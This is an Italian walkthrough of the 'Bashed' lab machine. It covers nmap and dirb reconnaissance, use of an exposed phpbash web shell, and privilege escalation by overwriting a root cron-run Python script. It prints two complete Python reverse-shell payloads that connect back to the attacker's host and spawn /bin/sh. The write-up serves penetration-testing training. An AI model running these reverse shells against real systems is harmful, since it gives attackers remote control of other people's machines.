# Bashed

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap per conoscere le porte aperte e i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.68
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 80** Apache httpd 2.4.18

```text
Nmap scan report for 10.10.10.68
Host is up (0.074s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/19%OT=80%CT=1%CU=31805%PV=Y%DS=2%DC=I%G=Y%TM=65095D2
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=107%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
```

## Enumeration

In questa fase cerco di capire se qualcuno di questi servizi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 80 Apache 2.4.18

Non trovo nulla di interessante da sfruttare.

### 3) Direcotory enumeration

Utilizzo il comando dirb, dal quale ottengo il seguente risultato:

```text
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 19 04:37:19 2023
URL_BASE: http://10.10.10.68/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.68/ ----
==> DIRECTORY: http://10.10.10.68/css/                                                                              
==> DIRECTORY: http://10.10.10.68/dev/                                                                              
==> DIRECTORY: http://10.10.10.68/fonts/                                                                            
==> DIRECTORY: http://10.10.10.68/images/                                                                           
+ http://10.10.10.68/index.html (CODE:200|SIZE:7743)                                                                
==> DIRECTORY: http://10.10.10.68/js/
```

Provo ad ispezionare la seguete pagina http://10.10.10.68/dev/ e mi ritrovo qui:

<p align="center">
  <img src="/Immagini/Linux-Box/Bashed/bashed-1.png" />
</p>

Aprendo il file _phpbash.php_ accedo a una shell dalla quale riesco a ricavare il primo flag user.txt.

<p align="center">
  <img src="/Immagini/Linux-Box/Bashed/bashed-2.png" />
</p>

## Privilege Escalation

Per prima cosa controllo i permessi dell'utente:

<p align="center">
  <img src="/Immagini/Linux-Box/Bashed/bashed-3.png" />
</p>

Quindi posso utilizzare l'utente _scriptmanager_ senza il bisgono di conoscere una password.

Prima di proseguire avvio una reverse shell sulla mia macchina. Per farlo faccio partire un listener sulla porta 4444 e sfrutto python sulla macchina bashed attraverso l'utilizzo di questo comando:

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Successivamente cambio l'utente a _scriptmanager_:

```text
sudo -i -u scriptmanager
```

Mi soffermo sulla direcotry _/scripts_ sulla quale l'utente _scriptmanager_ ha i privilegi in lettura/scrittura.

<p align="center">
  <img src="/Immagini/Linux-Box/Bashed/bashed-4.png" />
</p>

Noto che lo script python test.py scrive sul file test.txt, il quale ha privilegi root. Inoltre, il file test.txt è stato creato da poco e sembra che venga aggiornato ogni minuto. Per questo motivo può essere sfruttato per creare una reverse shell con privilegi root.

Sulla mia macchina creo uno script _test.py_ che mi permettera di generare una reverse shell (preso da [qui](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/cd15b05d-822f-494d-939a-ae5a671222ff.xhtml)):

```text
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.2",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Modifico i permessi:

```text
chmod 777 test.py
```

Successivamente, prima di procedere all'invio del file alla macchina bashed, avvio un listener sulla porta 5555.

**Sono dentro!**

<p align="center">
  <img src="/Immagini/Linux-Box/Bashed/bashed-5.png" />
</p>
